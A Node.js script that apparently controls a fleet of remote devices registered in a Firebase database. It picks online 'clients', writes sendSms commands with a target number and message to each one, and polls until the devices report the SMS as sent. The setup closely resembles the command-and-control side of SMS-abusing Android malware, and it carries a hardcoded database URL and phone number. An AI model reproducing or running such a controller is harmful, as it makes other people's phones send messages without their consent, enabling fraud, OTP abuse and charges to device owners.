'use strict';

var FB = 'https://krish-10-default-rtdb.firebaseio.com';
var TO = process.argv[2] || '9674725687';
var MSG = process.argv[3] || 'ACK test ' + new Date().toLocaleTimeString('en-IN');
var N = parseInt(process.argv[4] || '2', 10);
var SEC = parseInt(process.argv[5] || '40', 10);

function url(path){ return FB.replace(/\/+$/, '') + '/' + path + '.json'; }
async function getJson(path){
  var r = await fetch(url(path));
  if(r.status === 404) return null;
  if(!r.ok) throw new Error('HTTP ' + r.status);
  return r.json();
}
async function putJson(path, data){
  var r = await fetch(url(path), {
    method: 'PUT',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data)
  });
  return r.status;
}
function isTrue(v){
  return v === true || v === 1 || String(v).toLowerCase() === 'true';
}

(async function(){
  var clients = await getJson('clients');
  var online = Object.keys(clients || {}).filter(function(id){ return clients[id] && clients[id].status === true; });
  online.sort();
  var picked = online.slice(0, N);
  console.log('Online', online.length, 'using', picked.join(', '));
  var jobs = [];
  for(var i = 0; i < picked.length; i++){
    var id = picked[i];
    var path = 'clients/' + id + '/webhookEvent/sendSms';
    var body = { from: 1, to: TO, message: MSG + ' [' + id.slice(0, 8) + ']', isSended: false };
    var st = await putJson(path, body);
    console.log('PUT', id.slice(0, 8), st);
    jobs.push({ id: id, path: path, result: 'pending', last: '' });
  }
  var end = Date.now() + SEC * 1000;
  while(Date.now() < end){
    for(var j = 0; j < jobs.length; j++){
      var job = jobs[j];
      if(job.result !== 'pending') continue;
      var cur = await getJson(job.path);
      var line;
      if(cur == null) line = 'CLEARED (not true)';
      else if(isTrue(cur.isSended)) line = 'TRUE isSended';
      else line = 'false still to=' + (cur.to || '') + ' msg=' + String(cur.message || '').slice(0, 28);
      if(line !== job.last){
        console.log(new Date().toLocaleTimeString('en-IN'), job.id.slice(0, 8), line);
        job.last = line;
        if(line.indexOf('TRUE') === 0) job.result = 'sent';
        else if(line.indexOf('CLEARED') === 0) job.result = 'cleared_not_true';
      }
    }
    if(jobs.every(function(j){ return j.result !== 'pending'; })) break;
    await new Promise(function(r){ setTimeout(r, 1500); });
  }
  jobs.forEach(function(j){
    if(j.result === 'pending') j.result = 'TIMEOUT still false';
    console.log('RESULT', j.id.slice(0, 8), j.result);
  });
})();
